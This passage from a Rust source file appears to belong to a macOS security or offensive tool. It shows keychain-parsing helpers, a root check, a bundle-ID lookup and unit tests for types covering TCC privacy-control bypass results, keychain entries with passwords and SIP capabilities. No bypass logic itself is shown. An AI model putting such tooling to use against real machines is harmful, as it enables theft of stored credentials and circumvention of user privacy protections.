                key.access_group = Some(extract_quoted_value(line));
            } else if line.contains("type:") || line.contains("\"klbl\"") {
                key.key_type = Some(extract_quoted_value(line));
            } else if line.contains("\"cdat\"") {
                key.creation_date = Some(extract_quoted_value(line));
            }
        }

        // Include both SE and non-SE keys for completeness, but mark
        // SE keys specially.
        if is_secure_enclave || block.contains("class: \"keys\"") {
            keys.push(key);
        }
    }

    Ok(keys)
}

// ═══════════════════════════════════════════════════════════════════════════
// §5  Utility Functions
// ═══════════════════════════════════════════════════════════════════════════

/// Check if the current process is running as root (UID 0).
fn is_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}

/// Get the current executable path as a string.
fn _current_exe_path() -> String {
    std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string()
}

/// Get the current process's bundle ID (if running from an app bundle).
fn _current_bundle_id() -> Option<String> {
    // Check if we're running from an app bundle.
    let exe = std::env::current_exe().ok()?;
    // Walk up the path to find a .app bundle.
    let mut current = exe.as_path();
    while let Some(parent) = current.parent() {
        if let Some(name) = parent.file_name().and_then(|n| n.to_str()) {
            if name.ends_with(".app") {
                // Read the Info.plist from the bundle.
                let plist = parent.join("Contents/Info.plist");
                if plist.exists() {
                    let output = std::process::Command::new("/usr/bin/defaults")
                        .args(["read", plist.to_str()?, "CFBundleIdentifier"])
                        .output()
                        .ok()?;
                    if output.status.success() {
                        return Some(
                            String::from_utf8_lossy(&output.stdout).trim().to_string(),
                        );
                    }
                }
            }
        }
        current = parent;
    }
    None
}

// ═══════════════════════════════════════════════════════════════════════════
// §6  Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tcc_resource_service_names() {
        assert_eq!(
            TccResource::Camera.service_name(),
            "kTCCServiceCamera"
        );
        assert_eq!(
            TccResource::FullDiskAccess.service_name(),
            "kTCCServiceSystemPolicyAllFiles"
        );
        assert_eq!(
            TccResource::ScreenRecording.service_name(),
            "kTCCServiceScreenCapture"
        );
        assert_eq!(
            TccResource::Accessibility.service_name(),
            "kTCCServiceAccessibility"
        );
    }

    #[test]
    fn test_tcc_resource_coverage() {
        // Ensure every variant maps to a non-empty service name.
        let resources = [
            TccResource::Camera,
            TccResource::Microphone,
            TccResource::ScreenRecording,
            TccResource::FullDiskAccess,
            TccResource::DesktopFolder,
            TccResource::DocumentsFolder,
            TccResource::DownloadsFolder,
            TccResource::Contacts,
            TccResource::Calendar,
            TccResource::Reminders,
            TccResource::Photos,
            TccResource::Accessibility,
            TccResource::PostEvent,
        ];
        for r in &resources {
            assert!(
                !r.service_name().is_empty(),
                "TccResource::{:?} has empty service name",
                r
            );
            assert!(
                r.service_name().starts_with("kTCCService"),
                "TccResource::{:?} service name doesn't start with kTCCService: {}",
                r,
                r.service_name()
            );
        }
    }

    #[test]
    fn test_sip_status_parsing() {
        // Test that we can parse csrutil output correctly.
        let enabled_text = "System Integrity Protection status: enabled.";
        assert!(enabled_text.contains("enabled"));

        let disabled_text = "System Integrity Protection status: disabled.";
        assert!(disabled_text.contains("disabled"));
    }

    #[test]
    fn test_extract_quoted_value() {
        assert_eq!(
            extract_quoted_value("\"svce\"<blob>=\"com.apple.Safari\""),
            "com.apple.Safari"
        );
        assert_eq!(
            extract_quoted_value("service: \"MyService\""),
            "MyService"
        );
    }

    #[test]
    fn test_xpc_search_paths_exist() {
        // On macOS, at least some of these paths should exist.
        let any_exist = XPC_SEARCH_PATHS.iter().any(|p| Path::new(p).exists());
        // This test is informational — on non-macOS CI, none may exist.
        println!("XPC search paths existence: {}", any_exist);
    }

    #[test]
    fn test_is_root_check() {
        // is_root() should return false in normal test execution.
        let result = is_root();
        // In CI we may or may not be root; just verify it doesn't panic.
        println!("Running as root: {}", result);
    }

    #[test]
    fn test_keychain_entry_type_default() {
        let entry = KeychainEntry {
            service: "test.service".to_string(),
            account: "testuser".to_string(),
            password: None,
            entry_type: KeychainEntryType::GenericPassword,
            label: None,
            creation_date: None,
            modification_date: None,
            access_group: None,
        };
        assert_eq!(entry.entry_type, KeychainEntryType::GenericPassword);
        assert!(entry.password.is_none());
    }

    #[test]
    fn test_sip_capability_debug_format() {
        let cap = SipCapability::DebugAnyProcess;
        let formatted = format!("{:?}", cap);
        assert_eq!(formatted, "DebugAnyProcess");
    }

    #[test]
    fn test_tcc_bypass_result_structure() {
        let result = TccBypassResult {
            resource: TccResource::Camera,
            success: false,
            technique: "test".to_string(),
            message: "test message".to_string(),
        };
        assert!(!result.success);
        assert_eq!(result.resource, TccResource::Camera);
    }
}
